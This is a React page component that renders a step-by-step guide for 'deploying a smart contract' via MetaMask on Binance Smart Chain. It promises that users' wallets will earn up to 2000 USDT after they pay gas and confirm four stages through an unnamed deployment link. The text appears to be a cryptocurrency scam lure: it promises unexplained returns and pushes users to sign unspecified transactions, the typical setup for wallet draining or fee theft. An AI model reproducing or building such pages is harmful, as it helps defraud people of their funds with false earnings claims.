export default function Page() {
    const steps = [
      {
        title: "Install MetaMask",
        content: "Download and install MetaMask:\n• Android/iOS: Install from App Store/Google Play\n• Windows/Mac: Add Chrome extension"
      },
      {
        title: "Change Network to BSC", 
        content: "Switch MetaMask network to Binance Smart Chain (BSC) in network settings"
      },
      {
        title: "Add BNB (BEP20)",
        content: "Deposit BNB (BEP20) into your wallet for gas fees"
      },
      {
        title: "Open Deployment Link",
        content: "• Android/iOS: Open Web3 browser in MetaMask and paste deployment link\n• Windows/Mac: Paste link directly in browser"
      },
      {
        title: "Ensure BNB Balance",
        content: "Have sufficient BNB to cover gas fees for all 4 deployment stages"
      },
      {
        title: "Deploy Contract",
        content: "Start deployment and confirm all 4 stages. Do not quit mid-process"
      },
      {
        title: "Completion",
        content: "Once deployed, your wallet joins contract pool to earn up to 2000 USDT"
      },
      {
        title: "Manage USDT",
        content: "Store/sell earned USDT (BEP20) on:\n• Binance\n• Bybit\n• Coinbase"
      }
    ];
  
    return (
      <div className="px-8 py-4 space-y-10">
        <h1 className="text-2xl tracking-wider">
          How to Deploy the smart contract
        </h1>
  
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {steps.map((step, index) => (
            <div key={index} className="bg-[#090C17] border border-white/20 rounded-xl py-4 px-6">
              <h3 className="font-semibold text-lg mb-2">
                Step {index + 1}: {step.title}
              </h3>
              <p className="text-gray-300 whitespace-pre-line">
                {step.content}
              </p>
            </div>
          ))}
        </div>
      </div>
    );
  }